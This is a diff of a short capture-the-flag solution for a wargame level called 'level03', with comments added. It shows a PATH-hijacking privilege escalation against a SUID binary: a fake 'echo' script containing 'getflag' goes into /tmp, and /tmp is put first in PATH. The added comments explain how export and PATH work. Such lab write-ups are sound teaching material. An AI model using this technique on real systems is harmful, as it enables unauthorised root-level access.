@@ -1,4 +1,14 @@
+# method: privelege excalation 
+# vulnerability: SUID permission
+
 ltrace ./level03
 echo getflag > /tmp/echo && chmod +x /tmp/echo
-export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH 
 ./level03
+
+# export -  make the local shell variable VAR global or called by PATH.
+# $PATH - environmental variable, a colon-delimited list of directories that tells the shell which directories to search for executable files.
+# PATH=/tmp - only tmp directory would be in PATH
+# PATH=/tmp:$PATH - tmp directory will be added to the existing list in PATH
+
+# level03 calls echo -> save variable called echo with text getflag -> add directory with it to the PATH
